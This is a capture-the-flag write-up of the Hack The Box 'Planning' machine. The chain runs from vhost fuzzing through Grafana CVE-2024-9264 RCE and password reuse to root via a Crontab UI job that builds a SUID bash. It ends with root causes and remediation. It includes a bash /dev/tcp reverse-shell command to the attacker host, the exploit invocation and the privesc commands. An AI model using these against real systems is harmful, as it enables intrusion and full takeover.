# Planning — HTB Easy Linux

**Chain:** vhost fuzz → Grafana 11.0.0 (CVE-2024-9264, DuckDB RCE) → container root → creds in env → password reuse → SSH host → Crontab UI root cron → SUID bash → root

**Date:** 2026-07-17/18 · ~4.5h across 2 sessions · **user + root owned**

---

## Recon

Assumed breach. Box hands you `admin:0D5oT70Fq13EvB5r`.

```
nmap -p- --min-rate 5000 <IP>
nmap -p22,80 -sCV <IP>
```

22 (SSH), 80 (nginx). Host `planning.htb` → `/etc/hosts`. Root site is a dead end, so fuzz vhosts:

```
ffuf -w <dns-list> -u http://planning.htb -H "Host: FUZZ.planning.htb" -fs <size>
```

Hit: `grafana.planning.htb`. The main site is bait — the target is the subdomain.

## Foothold — CVE-2024-9264

Grafana v11.0.0 (Help menu). Authenticated RCE: SQL expressions reach DuckDB, `shellfs` extension shells out.

```
python3 ex.py -u admin -p '0D5oT70Fq13EvB5r' -c "id" http://grafana.planning.htb/
# uid=0(root)
```

PoC internals confirm the mechanism: `install shellfs from community; LOAD shellfs; SELECT * FROM read_csv('id ... |')`. Untrusted SQL → engine that loads command-exec extensions. Same shape as any injection-to-RCE.

Caught a shell (macOS BSD nc — no `-p`):

```
nc -lvn 4444
python3 ex.py -u admin -p '0D5oT70Fq13EvB5r' -c 'bash -c "bash -i >& /dev/tcp/<TUN0>/4444 0>&1"' http://grafana.planning.htb/
```

Note: nollium PoC wants `psycopg2-binary` in a venv, else pg_config build fails on macOS.

## Pivot — container to host

Landed root in a Docker container (`7ce659d667d7`, `/usr/share/grafana`), not the host. No `.env` on disk, so dump the environment:

```
env
# GF_SECURITY_ADMIN_USER=enzo
# GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
```

Grafana admin password is reused as enzo's system password. One leaked secret breaks containment.

```
ssh enzo@<IP>          # RioTecRANDEntANT!
cat ~/user.txt
```

## Root — Crontab UI → SUID bash

Re-enumerated from the host — external nmap can't see localhost binds:

```
ss -tlnp
# 127.0.0.1:8000   Crontab UI  <-- target
# 127.0.0.1:3000   Grafana
# 127.0.0.1:3306   MySQL
```

8000 is localhost-only → forward it over SSH:

```
ssh -L 8000:127.0.0.1:8000 enzo@<IP>
# browse http://localhost:8000
```

Crontab UI runs as **root**, so any job it schedules executes as root. Created a job to build a root-owned SUID copy of bash:

```
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
```

Why this works:
- `cp` runs as root (the cron's identity) → `/tmp/rootbash` is **owned by root**.
- `chmod +s` sets the **SUID bit** → the file executes with the **owner's** effective UID (root), regardless of who launches it.
- enzo has execute on it (others `r-x`), so enzo can run it; SUID makes that run land as root.

Then as enzo, `-p` stops bash dropping the elevated euid:

```
/tmp/rootbash -p
id
# uid=1000(enzo) gid=1000(enzo) euid=0(root) egid=0(root) groups=0(root),1000(enzo)
cat /root/root.txt
```

`euid=0(root)` = root powers. Real vs effective UID split is the whole privesc in one line: logged in as enzo (uid=1000), operating as root (euid=0).

## Notes for the report
- Way in was the vhost, not the root site. Always fuzz subdomains.
- Found 8000 only by re-enumerating post-foothold. New access = new recon.
- Two *separate* root-related findings at two layers: (1) Grafana **container** running as root — contained on its own; (2) Crontab UI on the **host** running as root — the actual privesc. Don't conflate them.
- Kill chain: CVE foothold → cleartext secret → password reuse → root service. The CVE is the smallest part; secrets hygiene + least privilege lose the box.

## Root causes (one per layer — interview-ready)
1. **Grafana CVE-2024-9264** — unsanitised SQL reaching a command-exec engine (DuckDB/shellfs). → input validation.
2. **Secrets in plaintext env var** — credential exposure. → secrets store.
3. **Password reuse** (Grafana admin = enzo's SSH) — bridged container → host. → unique creds per service/account.
4. **Crontab UI running as root** — trivial privesc via root-owned SUID bash. → least privilege.

## Remediation
- Patch Grafana; lock down DuckDB extension loading.
- No plaintext admin passwords in env — use a secrets store.
- Unique creds per service. Reuse is what bridged container → host.
- Crontab UI as root is the final misconfig; drop its privileges.
- Audit SUID-root binaries (`find / -perm -4000`); minimise them.
- Maps to OWASP A03 (Injection) / A05 (Misconfig) / A07 (Auth failures / credential reuse). STRIDE: EoP, Info Disclosure.

## Tools
`nmap` · `ffuf` · CVE-2024-9264 PoC (nollium) · `nc` · `ssh -L` · `ss` · `chmod +s` / SUID bash
